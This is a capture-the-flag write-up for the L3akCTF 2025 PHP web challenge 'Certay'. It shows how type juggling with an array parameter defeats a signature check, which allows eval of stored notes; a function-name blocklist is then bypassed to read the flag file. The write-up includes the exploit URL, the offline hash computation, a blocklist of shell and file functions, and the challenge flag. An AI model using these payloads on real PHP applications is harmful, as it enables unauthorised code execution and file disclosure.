---
title: L3akCTF 2025 - Certay
date: 2025-07-28
lastmod: 2025-07-28T19:59:34+02:00
categories:
  - writeup
  - L3akCTF
tags:
  - web
  - php
authors:
  - Valenter
---
A mixture of variable confusion, type juggling and broken crypto, let's take a look.
## Examining the vulnerability

We have a few different files at our disposal, but the only one we care about is `dashboard.php`.

There are a few glaring issues with the code that stand out at a glance

```php
define('yek', $_SESSION['yek']);          
...
if (!isset($_SESSION['yek'])) {           
    $_SESSION['yek'] = openssl_random_pseudo_bytes(
        openssl_cipher_iv_length('aes-256-cbc')
    );
}
```
At first, this could seem like it spells disaster for us, if it wasn't for the fact that `yek` isn't actually used in the code:

```php
if (custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === $_GET['hash'])
```
This `custom_sign` function takes in `$yek` instead, which is **undefined**.

Likewise, `safe_sign` uses `iv`, which is also undefined, this causes PHP to take 'iv' as a literal instead
```php
function safe_sign($data) {
    return openssl_encrypt($data, 'aes-256-cbc', KEY, 0, iv);
}
```
(*Note: this behavior has been deprecated in recent versions*)

KEY is hard-coded in `config.php`, but we don't really care about that.

Why?

## The exploit

We can use PHP type juggling to input the key parameter as an **array** instead of a string:

```php
dashboard.php?key[]=foo
```

This makes `safe_sign` return NULL, which in turn grants us the ability to fully manipulate `custom_sign`:

```php
custom_sign($_GET['msg'], $yek, safe_sign($_GET['key'])) === custom_sign($_GET['msg'], NULL, NULL)
```
This is equivalent to

```php
openssl_encrypt($msg, 'aes-256-cbc', NULL, 0, NULL)
```
We can therefore calculate the hash offline for a specific message and use it, along with said message, to access this part of the code:
```php
        echo "<div class='success'>Wow! Hello buddy I know you! Here is your secret files:</div>";
        $stmt = $db->prepare("SELECT content FROM notes WHERE user_id = ?");
        $stmt->execute([$_SESSION['user_id']]);
        $notes = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if (!$notes) {
            echo "<p>Nothing here.</p>";
        } else {
            foreach ($notes as $note) {
                $content = $note['content'];
                if (strpos($content, '`') !== false) {
                    echo 'You are a betrayer!';
                    continue;
                }
                $isBetrayal = false;
                foreach ($dangerous as $func) {
                    if (preg_match('/\b' . preg_quote($func, '/') . '\s*\(/i', $content)) {
                        $isBetrayal = true;
                        break;
                    }
                }
                if ($isBetrayal) {
                    echo 'You are a betrayer!';
                    continue;
                }
                try {
                    eval($content);
                } catch (Throwable $e) {
                    echo "<pre class='error'>Eval error: "
                    . htmlspecialchars($e->getMessage())
                    . "</pre>";
                }
            }
        }
```
But we still have to bypass the blocklist:
```php
$dangerous = [
'exec', 'shell_exec', 'system', 'passthru', 'proc_open', 'popen', '$', '`',
'curl_exec', 'curl_multi_exec', 'eval', 'assert', 'create_function',
'include', 'include_once', 'require', 'require_once', "file_get_contents",
'readfile', 'fopen', 'fwrite', 'fclose', 'unlink', 'rmdir',
'copy', 'rename', 'chmod', 'chown', 'chgrp', 'touch', 'mkdir',
'rmdir', 'fseek', 'fread', 'fgets', 'fgetcsv',
'file_put_contents', 'stream_get_contents', 'stream_copy_to_stream',
'stream_get_line', 'stream_set_blocking', 'stream_set_timeout',
'stream_select', 'stream_socket_client', 'stream_socket_server',
'stream_socket_accept', 'stream_socket_recvfrom', 'stream_socket_sendto',
'stream_socket_get_name', 'stream_socket_pair', 'stream_context_create',
'stream_context_set_option', 'stream_context_get_options'
];
```
But that's easy enough: `highlight_file('/tmp/flag.txt');` will do.

## Putting it all together

Let's compute the hash for message `testmessage` offline:
```php
<?php
$msg  = 'testmessage';                     // scegli tu
$hash = openssl_encrypt('testmessage', 'aes-256-cbc', NULL, 0, NULL);
echo $hash;                        
?>
```

`E/fVzDJCHnsOolo60416CQ==`

The final payload thus becomes:

```php
`dashboard.php?key[]=foo&msg=testmessage&hash=E/fVzDJCHnsOolo60416CQ==`
```

```php
`highlight_file('/tmp/flag.txt');`
```

**`L3AK{N0t_4_5ecret_4nYm0r3333!!5215kgfr5s85z9}`**